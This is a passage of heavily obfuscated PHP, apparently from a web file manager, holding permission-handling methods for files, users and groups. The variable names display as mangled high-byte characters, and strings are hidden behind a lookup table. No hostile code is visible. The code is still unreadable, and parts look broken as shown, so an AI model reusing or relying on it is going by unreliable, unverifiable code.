$‡ç¸Ôà¢[571] => 1); $¯¾®‡ôŒ = $this->where($·ı§Û§à)->field($‡ç¸Ôà¢[674])->select(); if (empty($¯¾®‡ôŒ)) { return; } $í…±á¼Œ = array_to_keyvalue($¯¾®‡ôŒ, $‡ç¸Ôà¢[12], $‡ç¸Ôà¢[674]); $this->remove($í…±á¼Œ); } private function shareFileMeta($Õ—û½Œï, $©ŠÙàúÛ = null) { $ıİ¼ô› =& $_SERVER[ÕŸ²ó÷å]; $¿ëü¤¿ß = array($ıİ¼ô›[550] => $Õ—û½Œï, $ıİ¼ô›[107] => $ıİ¼ô›[2155]); if (is_null($©ŠÙàúÛ)) { return Model($ıİ¼ô›[2156])->where($¿ëü¤¿ß)->find(); } $¿ëü¤¿ß[$ıİ¼ô›[459]] = $©ŠÙàúÛ; Model($ıİ¼ô›[2156])->add($¿ëü¤¿ß, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\163\157\x75\x72\x63\x65\x5f\141\x75\x74\150"; public function getAuth($˜é¶‘§é) { $°“âòÆ =& $_SERVER[ÕŸ²ó÷å]; $•†¬ò®„ = $this->sourceAuthSelect($˜é¶‘§é); $‘•¶Åã€ = array(); $Ÿ¹øµ§œ = array(); $êÌĞ­İ = 2 << 25; foreach ($•†¬ò®„ as $‚Œ´âˆ¸) { $â‰‘‹ˆ = Model($°“âòÆ[580])->listData($‚Œ´âˆ¸[$°“âòÆ[2080]]); if (!$â‰‘‹ˆ) { continue; } $‘•¶Åã€[] = $‚Œ´âˆ¸; $€¹Ùñî’ = 0; if ($‚Œ´âˆ¸[$°“âòÆ[200]] == SourceModel::TYPE_GROUP) { $€¹Ùñî’ = $êÌĞ­İ * 2; } if ($‚Œ´âˆ¸[$°“âòÆ[200]] == SourceModel::TYPE_USER) { $€¹Ùñî’ = $êÌĞ­İ; } if ($‚Œ´âˆ¸[$°“âòÆ[200]] == SourceModel::TYPE_USER && $‚Œ´âˆ¸[$°“âòÆ[578]] == $°“âòÆ[238]) { $€¹Ùñî’ = 0; } $Ÿ¹øµ§œ[] = $â‰‘‹ˆ[$°“âòÆ[496]] + $€¹Ùñî’; } array_multisort($Ÿ¹øµ§œ, SORT_DESC, $‘•¶Åã€); return $‘•¶Åã€; } public function sourceAuthSelect($ñğÈË­) { $¤‚Ñ˜ò¯ =& $_SERVER[ÕŸ²ó÷å]; static $äÌ¾ôî± = array(); $áÎÅ©É = is_array($ñğÈË­) ? !1 : !0; if ($áÎÅ©É) { $ñğÈË­ = array($ñğÈË­); } $ÁşÊš = array(); foreach ($ñğÈË­ as $²ù œè¯) { if (isset($äÌ¾ôî±[$²ù œè¯])) { $ÁşÊš[$²ù œè¯] = $äÌ¾ôî±[$²ù œè¯]; } } if (count($ÁşÊš) == count($ñğÈË­)) { return $áÎÅ©É ? $ÁşÊš[$ñğÈË­[0]] : $ÁşÊš; } $§Ó»¼ñä = $¤‚Ñ˜ò¯[2157]; $»“Ûçİ¹ = array($¤‚Ñ˜ò¯[203] => array($¤‚Ñ˜ò¯[7], $ñğÈË­)); $á¯Ãªıú = $this->field($§Ó»¼ñä)->order($¤‚Ñ˜ò¯[484])->where($»“Ûçİ¹)->select(); $µŒ‰‡ä = array_to_keyvalue_group($á¯Ãªıú, $¤‚Ñ˜ò¯[203]); foreach ($ñğÈË­ as $²ù œè¯) { $äÌ¾ôî±[$²ù œè¯] = $µŒ‰‡ä[$²ù œè¯] ? $µŒ‰‡ä[$²ù œè¯] : array(); } if ($áÎÅ©É) { return $á¯Ãªıú; } return $µŒ‰‡ä; } public function setAuth($™äÑ¯Îø, $ÄÁçÚê¾) { $ûĞ½í– =& $_SERVER[ÕŸ²ó÷å]; $¤¿’é = Model($ûĞ½í–[1421])->sourceInfo($™äÑ¯Îø); if (!$¤¿’é) { return !1; } if ($¤¿’é[$ûĞ½í–[200]] != SourceModel::TYPE_GROUP) { return !1; } $»Ö³¼‡ƒ = 1; $‘ª‡¹‘Ú = $¤¿’é[$ûĞ½í–[578]]; if ($‘ª‡¹‘Ú != $»Ö³¼‡ƒ) { $»¹Ñ—ªã = array($ûĞ½í–[1972] => $‘ª‡¹‘Ú); $æ ×ïôÈ = Model($ûĞ½í–[2066])->field($ûĞ½í–[1773])->where($»¹Ñ—ªã)->select(); $æ ×ïôÈ = array_to_keyvalue($æ ×ïôÈ, $ûĞ½í–[12], $ûĞ½í–[1773]); } $æÂºªÔ„ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $«ãä×Ö = array(); foreach ($ÄÁçÚê¾ as $ÏïÙË´á) { if (!in_array($ÏïÙË´á[$ûĞ½í–[200]], $æÂºªÔ„)) { show_json(LNG($ûĞ½í–[2158]), !1); } if ($‘ª‡¹‘Ú != $»Ö³¼‡ƒ) { if ($ÏïÙË´á[$ûĞ½í–[200]] == SourceModel::TYPE_GROUP) { } if ($ÏïÙË´á[$ûĞ½í–[578]] != 0 && !in_array($ÏïÙË´á[$ûĞ½í–[578]], $æ ×ïôÈ)) { } } if ($ÏïÙË´á[$ûĞ½í–[578]] == 0) { $ÏïÙË´á[$ûĞ½í–[200]] = SourceModel::TYPE_USER; } $«ãä×Ö[] = array($ûĞ½í–[203] => $™äÑ¯Îø, $ûĞ½í–[200] => intval($ÏïÙË´á[$ûĞ½í–[200]]), $ûĞ½í–[578] => intval($ÏïÙË´á[$ûĞ½í–[578]]), $ûĞ½í–[2080] => intval($ÏïÙË´á[$ûĞ½í–[2080]]) ? intval($ÏïÙË´á[$ûĞ½í–[2080]]) : 0, $ûĞ½í–[2140] => intval($ÏïÙË´á[$ûĞ½í–[2140]]) ? intval($ÏïÙË´á[$ûĞ½í–[2140]]) : -1); } $this->where(array($ûĞ½í–[500] => $™äÑ¯Îø))->delete(); $this->addAll($«ãä×Ö); return !0; } public function authClear($ˆò½Üë¦) { $î¡”¢²ˆ =& $_SERVER[ÕŸ²ó÷å]; $á“™ìŒõ = Model($î¡”¢²ˆ[1421])->sourceInfo($ˆò½Üë¦); $Ö°šœ• = array($ˆò½Üë¦); if ($á“™ìŒõ[$î¡”¢²ˆ[494]] == $î¡”¢²ˆ[101]) { $Ò€ÂÌÆ = array($î¡”¢²ˆ[661] => array($î¡”¢²ˆ[621], $á“™ìŒõ[$î¡”¢²ˆ[593]] . $ˆò½Üë¦ . $î¡”¢²ˆ[622])); $Ö°šœ• = Model($î¡”¢²ˆ[1421])->field($î¡”¢²ˆ[500])->where($Ò€ÂÌÆ)->getField($î¡”¢²ˆ[203], !0); $Ö°šœ•[] = $ˆò½Üë¦; } $this->where(array($î¡”¢²ˆ[500] => array($î¡”¢²ˆ[501], $Ö°šœ•)))->delete(); return !0; } public function getAllChildren($üçùÄî‹) { $²‡âÁ… =& $_SERVER[ÕŸ²ó÷å]; $ğú‰’ç” = Model($²‡âÁ…[1421])->sourceInfo($üçùÄî‹); if ($ğú‰’ç”[$²‡âÁ…[494]] != $²‡âÁ…[101]) { return $this->sourceListAuth(array($üçùÄî‹)); } if ($ğú‰’ç”[$²‡âÁ…[200]] != SourceModel::TYPE_GROUP) { return array(); } $Ííñ™‘¡ = 1; $«°ø×¥¸ = array($üçùÄî‹); if ($ğú‰’ç”[$²‡âÁ…[202]] == $²‡âÁ…[238] && $ğú‰’ç”[$²‡âÁ…[578]] != $Ííñ™‘¡) { $«°ø×¥¸ = $this->groupChidldAllRootSource($ğú‰’ç”[$²‡âÁ…[578]]); } $‚šû»°È = $this->field($²‡âÁ…[203])->group($²‡âÁ…[203])->select(); $‚šû»°È = array_to_keyvalue($‚šû»°È, $²‡âÁ…[12], $²‡âÁ…[203]); if (!$‚šû»°È) { return array(); } $Í¨Ş–Éå = $²‡âÁ…[2159]; $ÛèŸÓ¡  = array($²‡âÁ…[203] => array($²‡âÁ…[7], $‚šû»°È), $²‡âÁ…[514] => $²‡âÁ…[238]); $«¶ıüö = Model($²‡âÁ…[908])->field($Í¨Ş–Éå)->where($ÛèŸÓ¡ )->select(); $÷èıÚ°© = array($üçùÄî‹); foreach ($«¶ıüö as $ï³¦óğË) { foreach ($«°ø×¥¸ as $ª˜¸ÑÂÀ) { $ŸğïñÃ = $²‡âÁ…[50] . $ª˜¸ÑÂÀ . $²‡âÁ…[50]; $ıÅöÍëÉ = $ï³¦óğË[$²‡âÁ…[593]] . $ï³¦óğË[$²‡âÁ…[203]] . $²‡âÁ…[50]; if (strstr($ıÅöÍëÉ, $ŸğïñÃ)) { $÷èıÚ°©[] = $ï³¦óğË[$²‡âÁ…[203]]; break; } } } return $this->sourceListAuth($÷èıÚ°©); } private function sourceListAuth($É“ÛÚÓÎ) { $°»ó…Âô =& $_SERVER[ÕŸ²ó÷å]; $‹Šß”ö” = Model($°»ó…Âô[1421])->sourceListInfo($É“ÛÚÓÎ, !0); $ìÁ‘Ëù™ = $this->sourceAuthSelect($É“ÛÚÓÎ); $İë¥ä¤³ = array(); $½’Û›Èì = array(); foreach ($‹Šß”ö” as $ò´çïß) { unset($ò´çïß[$°»ó…Âô[538]]); unset($ò´çïß[$°»ó…Âô[536]]); unset($ò´çïß[$°»ó…Âô[496]]); unset($ò´çïß[$°»ó…Âô[100]]); $‡¢öÁó = $ìÁ‘Ëù™[$ò´çïß[$°»ó…Âô[203]]]; if (!$‡¢öÁó) { continue; } $ò´çïß[$°»ó…Âô[2160]] = $this->authTargetInfo($‡¢öÁó); $ò´çïß[$°»ó…Âô[591]] = rtrim($ò´çïß[$°»ó…Âô[597]], $°»ó…Âô[8]) . $°»ó…Âô[8] . ltrim($ò´çïß[$°»ó…Âô[591]], $°»ó…Âô[8]); $İë¥ä¤³[] = $ò´çïß; $áØâ›™ = count(explode($°»ó…Âô[8], trim($ò´çïß[$°»ó…Âô[591]], $°»ó…Âô[8]))); $½’Û›Èì[] = $áØâ›™ + ($ò´çïß[$°»ó…Âô[33]] == $°»ó…Âô[88] ? 0 : 1000); } array_multisort($½’Û›Èì, SORT_ASC, $İë¥ä¤³); return $İë¥ä¤³; } private function groupChidldAllRootSource($ò³Ó¨º) { $Òëğßì =& $_SERVER[ÕŸ²ó÷å]; $ğÊ­ ÑÜ = Model($Òëğßì[2161])->groupChildrenAll($ò³Ó¨º); $·¶º¯µı = array($Òëğßì[202] => 0, $Òëğßì[578] => array($Òëğßì[7], $ğÊ­ ÑÜ), $Òëğßì[200] => SourceModel::TYPE_GROUP); $Š¯•ıç = Model($Òëğßì[908])->field($Òëğßì[203])->where($·¶º¯µı)->select(); $Š¯•ıç = array_to_keyvalue($Š¯•ıç, $Òëğßì[12], $Òëğßì[203]); return $Š¯•ıç; } private function authTargetInfo($¨ä „®) { $Óµ½•Ä§ =& $_SERVER[ÕŸ²ó÷å]; $œ£•šÂ = array(); $ºì¬……© = array(); $ˆØóÊÈ¿ = 2 << 25; foreach ($¨ä „® as $™¯ÏúÄ) { $Öß•‚¯Å = Model($Óµ½•Ä§[580])->listData($™¯ÏúÄ[$Óµ½•Ä§[2080]]); if (!$Öß•‚¯Å) { continue; } if ($™¯ÏúÄ[$Óµ½•Ä§[200]] == SourceModel::TYPE_USER) { $Ô¹õ€†÷ = Model($Óµ½•Ä§[586])->getInfoSimpleOuter($™¯ÏúÄ[$Óµ½•Ä§[578]]); if ($Ô¹õ€†÷[$Óµ½•Ä§[1773]] == $Óµ½•Ä§[1276]) { continue; } if ($Ô¹õ€†÷[$Óµ½•Ä§[1773]] == $Óµ½•Ä§[238]) { $Ô¹õ€†÷[$Óµ½•Ä§[32]] = LNG($Óµ½•Ä§[2162]); } } else { $Ô¹õ€†÷ = Model($Óµ½•Ä§[594])->getInfoSimple($™¯ÏúÄ[$Óµ½•Ä§[578]]); } if (!$Ô¹õ€†÷) { continue; } $Ô¹õ€†÷[$Óµ½•Ä§[549]] = $Öß•‚¯Å; $œ£•šÂ[] = $Ô¹õ€†÷; $Ö®Áº²± = 0; if ($™¯ÏúÄ[$Óµ½•Ä§[200]] == SourceModel::TYPE_GROUP) { $Ö®Áº²± = $ˆØóÊÈ¿ * 2; } if ($™¯ÏúÄ[$Óµ½•Ä§[200]] == SourceModel::TYPE_USER) { $Ö®Áº²± = $ˆØóÊÈ¿; } if ($™¯ÏúÄ[$Óµ½•Ä§[200]] == SourceModel::TYPE_USER && $™¯ÏúÄ[$Óµ½•Ä§[578]] == $Óµ½•Ä§[238]) { $Ö®Áº²± = 0; } $ºì¬……©[] = $Öß•‚¯Å[$Óµ½•Ä§[496]] + $Ö®Áº²±; } array_multisort($ºì¬……©, SORT_DESC, $œ£•šÂ); return $œ£•šÂ; } public function getAllChildrenByUser($ƒá²ê¥, $õñüóÙØ) { $ƒªö¹Éá =& $_SERVER[ÕŸ²ó÷å]; $ØÛ–¸ = Model($ƒªö¹Éá[607])->getInfo($õñüóÙØ); if (!$õñüóÙØ || !$ƒá²ê¥ || !$ØÛ–¸) { return array(); } $ßÍ˜‡½û = Model($ƒªö¹Éá[1421])->sourceInfo($ƒá²ê¥); $×Ş†Ñí = array(); $Ã™ûªÆ = 1; if ($ßÍ˜‡½û[$ƒªö¹Éá[202]] == $ƒªö¹Éá[238] && $ßÍ˜‡½û[$ƒªö¹Éá[578]] != $Ã™ûªÆ && $this->groupContainUser($ßÍ˜‡½û[$ƒªö¹Éá[578]], $õñüóÙØ)) { foreach ($ØÛ–¸[$ƒªö¹Éá[2163]] as $€’ìÀÄÔ) { $Ü¹˜¹ì = Model($ƒªö¹Éá[594])->getInfo($€’ìÀÄÔ[$ƒªö¹Éá[1972]]); $ĞØµ˜˜ = Model($ƒªö¹Éá[607])->getInfoSimpleOuter($õñüóÙØ); $ĞØµ˜˜[$ƒªö¹Éá[549]] = $€’ìÀÄÔ[$ƒªö¹Éá[496]]; if (Model($ƒªö¹Éá[580])->authCheckAction($€’ìÀÄÔ[$ƒªö¹Éá[496]][$ƒªö¹Éá[496]], $ƒªö¹Éá[1993])) { continue; } $¦ÙØ•ï = array($ƒªö¹Éá[32] => $ƒªö¹Éá[1296] . $Ü¹˜¹ì[$ƒªö¹Éá[32]], $ƒªö¹Éá[203] => $Ü¹˜¹ì[$ƒªö¹Éá[100]][$ƒªö¹Éá[203]], $ƒªö¹Éá[97] => KodIO::make($Ü¹˜¹ì[$ƒªö¹Éá[100]][$ƒªö¹Éá[203]]), $ƒªö¹Éá[202] => $ƒªö¹Éá[238], $ƒªö¹Éá[200] => $ƒªö¹Éá[587], $ƒªö¹Éá[33] => $ƒªö¹Éá[625], $ƒªö¹Éá[591] => $Ü¹˜¹ì[$ƒªö¹Éá[598]], $ƒªö¹Éá[1972] => $Ü¹˜¹ì[$ƒªö¹Éá[1972]], $ƒªö¹Éá[595] => $Ü¹˜¹ì[$ƒªö¹Éá[202]], $ƒªö¹Éá[2160] => array($ĞØµ˜˜)); $×Ş†Ñí[$¦ÙØ•ï[$ƒªö¹Éá[203]]] = $¦ÙØ•ï; } } $ÚÊÑ™®¥ = array(); $øâùˆ = $this->getAllChildren($ƒá²ê¥); foreach ($øâùˆ as $¥àÏáÈ) { $¥®è‘Å¸ = !1; foreach ($¥àÏáÈ[$ƒªö¹Éá[2160]] as $ùêÕäáÓ) { if ($ùêÕäáÓ[$ƒªö¹Éá[1773]]) { if ($ùêÕäáÓ[$ƒªö¹Éá[1773]] == $õñüóÙØ) { $¥®è‘Å¸ = !0; break; } } if ($ùêÕäáÓ[$ƒªö¹Éá[1972]]) { if ($this->groupContainUser($ùêÕäáÓ[$ƒªö¹Éá[1972]], $õñüóÙØ)) { $¥®è‘Å¸ = !0; break; } } } if ($¥®è‘Å¸) { $ÚÊÑ™®¥[] = $¥àÏáÈ; } $­¥Œ íÉ = $¥àÏáÈ[$ƒªö¹Éá[203]]; if (isset($×Ş†Ñí[$­¥Œ íÉ])) { $¥àÏáÈ[$ƒªö¹Éá[2160]][] = $×Ş†Ñí[$­¥Œ íÉ][0]; $×Ş†Ñí[$­¥Œ íÉ] = !1; } } $×Ş†Ñí = array_filter(array_values($×Ş†Ñí)); $ÚÊÑ™®¥ = array_merge($×Ş†Ñí, $ÚÊÑ™®¥); return $ÚÊÑ™®¥; } public function setAllChildrenByUser($ÒœÈ§Éü, $ Ü¾ş¬Ë, $”­˜ƒ­Î) { $´Øİó÷û =& $_SERVER[ÕŸ²ó÷å]; $£÷ÊüáÉ = $this->getAllChildrenByUser($ÒœÈ§Éü, $ Ü¾ş¬Ë); if (!$”­˜ƒ­Î || !$£÷ÊüáÉ) { return !1; } foreach ($£÷ÊüáÉ as $ö¬ €ë¹) { $Â¿­¸„¦ = array(); foreach ($ö¬ €ë¹[$´Øİó÷û[2160]] as $×Ô±†Ù›) { $€çÕÚ¾Ï = $×Ô±†Ù›[$´Øİó÷û[549]]; $±Á¿ı« = $×Ô±†Ù›[$´Øİó÷û[1773]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Ûû“Ûœ× = $×Ô±†Ù›[$´Øİó÷û[1773]] ? $×Ô±†Ù›[$´Øİó÷û[1773]] : $×Ô±†Ù›[$´Øİó÷û[1972]]; if ($×Ô±†Ù›[$´Øİó÷û[1773]] && $×Ô±†Ù›[$´Øİó÷û[1773]] == $ Ü¾ş¬Ë) { continue; } $Â¿­¸„¦[] = array($´Øİó÷û[203] => $ö¬ €ë¹[$´Øİó÷û[203]], $´Øİó÷û[200] => $±Á¿ı«, $´Øİó÷û[578] => intval($Ûû“Ûœ×), $´Øİó÷û[2080] => isset($€çÕÚ¾Ï[$´Øİó÷û[484]]) ? intval($€çÕÚ¾Ï[$´Øİó÷û[484]]) : 0, $´Øİó÷û[2140] => isset($€çÕÚ¾Ï[$´Øİó÷û[2140]]) ? intval($€çÕÚ¾Ï[$´Øİó÷û[2140]]) : -1); } $Â¿­¸„¦[] = array($´Øİó÷û[203] => $ö¬ €ë¹[$´Øİó÷û[203]], $´Øİó÷û[200] => SourceModel::TYPE_USER, $´Øİó÷û[578] => intval($ Ü¾ş¬Ë), $´Øİó÷û[2080] => intval($”­˜ƒ­Î), $´Øİó÷û[2140] => -1); $this->where(array($´Øİó÷û[500] => $ö¬ €ë¹[$´Øİó÷û[203]]))->delete(); $this->addAll($Â¿­¸„¦); } return !0; } public function get($øíøñ¹š) { $©Ÿ¯ÖÈ¸ = $this->getSourceList(array($øíøñ¹š), !0); return $©Ÿ¯ÖÈ¸[0]; } public function getSourceList($çàùíêÉ, $ñö§ç»ü = false, $¼Óºšğ = false) { $„Ï³öº =& $_SERVER[ÕŸ²ó÷å]; if (!$çàùíêÉ) { return array(); } $ëåÆµŠ = Model($„Ï³öº[1421]); if (!$ñö§ç»ü && count($çàùíêÉ) == 1) { $ñö§ç»ü = array(); $ñö§ç»ü[$çàùíêÉ[0]] = $ëåÆµŠ->sourceInfo($çàùíêÉ[0]); } if (!$ñö§ç»ü) { $ê‰Ë¯Ü¼ = array($„Ï³öº[500] => array($„Ï³öº[501], $çàùíêÉ)); $ñö§ç»ü = $ëåÆµŠ->field($„Ï³öº[2164])->where($ê‰Ë¯Ü¼)->select(); $ñö§ç»ü = array_to_keyvalue($ñö§ç»ü, $„Ï³öº[203]); } $à‰Æ®©– = $çàùíêÉ; foreach ($ñö§ç»ü as $óóß²ƒ => $Ô¹ïåç) { $¡·Š‚¿ = $ëåÆµŠ->parentLevelArray($Ô¹ïåç[$„Ï³öº[593]]); $à‰Æ®©– = array_merge($à‰Æ®©–, array($óóß²ƒ), array_reverse($¡·Š‚¿)); } $à‰Æ®©– = array_values(array_unique($à‰Æ®©–)); if (!$à‰Æ®©–) { return array(); } $åÎ÷²ş = $this->sourceAuthSelect($à‰Æ®©–); $áÜÖ›Šğ = array(); foreach ($à‰Æ®©– as $ˆúŞØË£) { if (isset($åÎ÷²ş[$ˆúŞØË£])) { $áÜÖ›Šğ[$ˆúŞØË£] = $åÎ÷²ş[$ˆúŞØË£]; } } $°û¾íÀş = $this->userIsRoot($¼Óºšğ); $í’üÌˆ» = AuthModel::authAll(); $ÕÏ¹µã = array($„Ï³öº[497] => $í’üÌˆ», $„Ï³öº[2165] => array($„Ï³öº[502] => 0, $„Ï³öº[1978] => $í’üÌˆ», $„Ï³öº[503] => LNG($„Ï³öº[2166]), $„Ï³öº[1995] => $„Ï³öº[2167])); $Ÿ¿í‹¶Æ = array(); foreach ($ñö§ç»ü as $ˆúŞØË£ => $ƒ°‰ÊÓ•) { if ($°û¾íÀş && $GLOBALS[$„Ï³öº[6]][$„Ï³öº[1991]]) { $Ÿ¿í‹¶Æ[$ˆúŞØË£] = $ÕÏ¹µã; continue; } $Ÿ¿í‹¶Æ[$ˆúŞØË£] = $this->makeSourceAuth($ƒ°‰ÊÓ•, $áÜÖ›Šğ, $¼Óºšğ); } return $Ÿ¿í‹¶Æ; } public function authDeepCheck($ÑÅœÄò, $Ê²Öˆ´ = false) { $ÛÃã‡› =& $_SERVER[ÕŸ²ó÷å]; $Ê²Öˆ´ = $Ê²Öˆ´ ? $Ê²Öˆ´ : USER_ID; $ÔÑ‘©­Ó = $this->makeAuthDeep($Ê²Öˆ´); if (!in_array($ÑÅœÄò, $ÔÑ‘©­Ó[$ÛÃã‡›[2168]])) { return !1; } $÷ñõËŒØ = array(); foreach ($ÔÑ‘©­Ó[$ÛÃã‡›[2169]] as $ŸÅÒìİÈ => $àõµ³‹ş) { if (!in_array($ÑÅœÄò, $àõµ³‹ş)) { continue; } $÷ñõËŒØ[] = $ŸÅÒìİÈ; } if (!$÷ñõËŒØ) { return !1; } $Ã€†Øóš = $÷ñõËŒØ ? $÷ñõËŒØ[0] : $ÑÅœÄò; return array($ÛÃã‡›[497] => -1, $ÛÃã‡›[549] => array($ÛÃã‡›[502] => $ÛÃã‡›[1276], $ÛÃã‡›[1978] => $ÛÃã‡›[238], $ÛÃã‡›[503] => LNG($ÛÃã‡›[2170]), $ÛÃã‡›[1995] => $ÛÃã‡›[2171]), $ÛÃã‡›[2172] => LNG($ÛÃã‡›[2173]), $ÛÃã‡›[2174] => $this->sourceAuthInfo($Ã€†Øóš)); } protected function makeAuthDeep($†í¤Í‘ = false) { $°¾ø™¶ =& $_SERVER[ÕŸ²ó÷å]; static $ğëß£¸– = array(); $†í¤Í‘ = $†í¤Í‘ ? $†í¤Í‘ : USER_ID; if (isset($ğëß£¸–[$†í¤Í‘])) { return $ğëß£¸–[$†í¤Í‘]; } $àåşã±ç = Model($°¾ø™¶[2175])->listData(); $œÚÂáÂë = array(); foreach ($àåşã±ç as $î½¥à·) { if ($î½¥à·[$°¾ø™¶[496]] == 0 && $î½¥à·[$°¾ø™¶[1994]] == $°¾ø™¶[101]) { $œÚÂáÂë[] = $î½¥à·[$°¾ø™¶[484]]; } } $Ë©š¹÷ = $this->userGroupParents($†í¤Í‘); $Áäï¶Ù¶ = array($°¾ø™¶[200] => SourceModel::TYPE_USER, $°¾ø™¶[578] => $†í¤Í‘); if ($Ë©š¹÷) { $Áäï¶Ù¶ = array(array($°¾ø™¶[200] => SourceModel::TYPE_USER, $°¾ø™¶[578] => $†í¤Í‘), array($°¾ø™¶[200] => SourceModel::TYPE_GROUP, $°¾ø™¶[578] => array($°¾ø™¶[501], $Ë©š¹÷)), $°¾ø™¶[1081] => $°¾ø™¶[2074]); } $ì£ Ğ¿ = $this->field($°¾ø™¶[2176])->where($Áäï¶Ù¶)->select(); $¼ËŒÌşÑ = array(); $îëô¬œõ = array_to_keyvalue_group($ì£ Ğ¿, $°¾ø™¶[203]); foreach ($îëô¬œõ as $‚§‡‚« => $¾ÂÚ¸ÔÀ) { $–ÌäÉÒÒ = $this->authArrayCheck($¾ÂÚ¸ÔÀ, $†í¤Í‘); if ($–ÌäÉÒÒ[$°¾ø™¶[497]] > 0) { $¼ËŒÌşÑ[] = $‚§‡‚« . $°¾ø™¶[12]; } } if ($Ë©š¹÷) { $ŸÜİÚÇÎ = Model($°¾ø™¶[594]); foreach ($Ë©š¹÷ as $ĞŸŒ¢¤’) { $÷¬›‰¼ = $ŸÜİÚÇÎ->getInfo($ĞŸŒ¢¤’); if (!$÷¬›‰¼ || !is_array($÷¬›‰¼[$°¾ø™¶[100]])) { continue; } $¼ËŒÌşÑ[] = $÷¬›‰¼[$°¾ø™¶[100]][$°¾ø™¶[203]]; } } $èíª¸ú¥ = array(); $‡†é—¹ = $Ë©š¹÷; $Èäõİ‹¼ = Model($°¾ø™¶[1421]); $ŸÜİÚÇÎ = Model($°¾ø™¶[594]); $»˜ì ‚ï = array(); $ûÈËÄÜ© = array(); $×’Œ’¥ó = array(); $‰ÃˆÂ = array(); if ($¼ËŒÌşÑ) { $›ÏÑ– = $Èäõİ‹¼->where(array($°¾ø™¶[203] => array($°¾ø™¶[501], $¼ËŒÌşÑ)))->select(); foreach ($›ÏÑ– as $Ç¸²ÄÜ‚) { $Ûû‰ÙÕ = $Èäõİ‹¼->parentLevelArray($Ç¸²ÄÜ‚[$°¾ø™¶[593]]); $èíª¸ú¥ = array_merge($èíª¸ú¥, $Ûû‰ÙÕ); $‡†é—¹[] = $Ç¸²ÄÜ‚[$°¾ø™¶[578]]; $»˜ì ‚ï[$Ç¸²ÄÜ‚[$°¾ø™¶[203]]] = $Ûû‰ÙÕ; $ûÈËÄÜ©[$Ç¸²ÄÜ‚[$°¾ø™¶[203]]] = $Ç¸²ÄÜ‚[$°¾ø™¶[578]]; } } $‡†é—¹ = array_values(array_unique($‡†é—¹)); $Î§©ú­ƒ = $‡†é—¹; foreach ($Î§©ú­ƒ as $ĞŸŒ¢¤’) { $÷¬›‰¼ = $ŸÜİÚÇÎ->getInfo($ĞŸŒ¢¤’); $Ûû‰ÙÕ = $Èäõİ‹¼->parentLevelArray($÷¬›‰¼[$°¾ø™¶[593]]); $‡†é—¹ = array_merge($‡†é—¹, $Ûû‰ÙÕ); } $‡†é—¹ = array_values(array_unique($‡†é—¹)); foreach ($‡†é—¹ as $ĞŸŒ¢¤’) { $÷¬›‰¼ = $ŸÜİÚÇÎ->getInfo($ĞŸŒ¢¤’); $èíª¸ú¥[] = $÷¬›‰¼[$°¾ø™¶[100]][$°¾ø™¶[203]]; $×’Œ’¥ó[$ĞŸŒ¢¤’] = $÷¬›‰¼[$°¾ø™¶[100]][$°¾ø™¶[203]]; $‰ÃˆÂ[$ĞŸŒ¢¤’] = $Èäõİ‹¼->parentLevelArray($÷¬›‰¼[$°¾ø™¶[593]]); } foreach ($»˜ì ‚ï as $¹¨¹‘è… => $ƒÑ­Ôõ‹) { $¾×àÍ¸„ = $ûÈËÄÜ©[$¹¨¹‘è…]; if (!$¾×àÍ¸„ || !$×’Œ’¥ó[$¾×àÍ¸„]) { continue; } $”å¦â¾ = array(); foreach ($‰ÃˆÂ[$¾×àÍ¸„] as $ĞŸŒ¢¤’) { $”å¦â¾[] = $×’Œ’¥ó[$ĞŸŒ¢¤’]; } $»˜ì ‚ï[$¹¨¹‘è…] = array_merge($”å¦â¾, $ƒÑ­Ôõ‹); } $èíª¸ú¥ = array_values(array_unique($èíª¸ú¥)); $”˜Å¯ÄÅ = array($°¾ø™¶[2168] => $èíª¸ú¥, $°¾ø™¶[2169] => $»˜ì ‚ï); $ğëß£¸–[$†í¤Í‘] = $”˜Å¯ÄÅ; return $”˜Å¯ÄÅ; } private function makeSourceAuth($õã–¶Æ‘, $Ã»ç¢·™, $‡Ë–µŞ£ = false) { $üßí¥•’ =& $_SERVER[ÕŸ²ó÷å]; $‚€ÛÒ¬÷ = $üßí¥•’[101]; $ ÷§©Ã½ = $õã–¶Æ‘[$üßí¥•’[578]]; $ƒ®®“…Ö = $õã–¶Æ‘[$üßí¥•’[200]] == SourceModel::TYPE_GROUP; $ûŸßøÈâ = $ƒ®®“…Ö ? $this->groupRootAuth($ ÷§©Ã½, $‡Ë–µŞ£) : !1; if ($ûŸßøÈâ && Model($üßí¥•’[580])->authCheckAction($ûŸßøÈâ[$üßí¥•’[496]], $üßí¥•’[1993])) { return $this->groupAuthInfo($ûŸßøÈâ, $ ÷§©Ã½); } $‚î‡Î¬ü = Model($üßí¥•’[1421])->parentLevelArray($õã–¶Æ‘[$üßí¥•’[593]]); $‚î‡Î¬ü = array_merge(array($õã–¶Æ‘[$üßí¥•’[203]]), array_reverse($‚î‡Î¬ü)); $£ÕæÍ×Ú = !1; foreach ($‚î‡Î¬ü as $ŸÉ‰Èá) { if (!isset($Ã»ç¢·™[$ŸÉ‰Èá])) { continue; } $¤ õÆ» = $this->authMake($Ã»ç¢·™[$ŸÉ‰Èá], $‡Ë–µŞ£); if ($¤ õÆ»[$üßí¥•’[549]]) { $£ÕæÍ×Ú = $¤ õÆ»; break; } } if (!$ƒ®®“…Ö) { return $£ÕæÍ×Ú; } if (!$£ÕæÍ×Ú && $ûŸßøÈâ) { $£ÕæÍ×Ú = $this->groupAuthInfo($ûŸßøÈâ, $ ÷§©Ã½); } if (!$£ÕæÍ×Ú) { $˜›üñ‰İ = Model($üßí¥•’[594])->getInfo($ ÷§©Ã½); $‹ñÜŠ°„ = explode($üßí¥•’[50], trim($˜›üñ‰İ[$üßí¥•’[593]], $üßí¥•’[50])); $‹ñÜŠ°„ = array_reverse($‹ñÜŠ°„); foreach ($‹ñÜŠ°„ as $ğ¥éàšñ) { if ($ğ¥éàšñ == $üßí¥•’[238] || $ğ¥éàšñ == $‚€ÛÒ¬÷) { continue; } $ê‘ü®§ã = $this->groupRootAuth($ğ¥éàšñ, $‡Ë–µŞ£); if (!$ê‘ü®§ã) { continue; } $£ÕæÍ×Ú = $this->groupAuthInfo($ê‘ü®§ã, $ğ¥éàšñ); break; } } if (!$£ÕæÍ×Ú || $£ÕæÍ×Ú[$üßí¥•’[497]] <= 0) { $Ã¼ÙŒÀ = $this->authDeepCheck($õã–¶Æ‘[$üßí¥•’[203]], $‡Ë–µŞ£); if 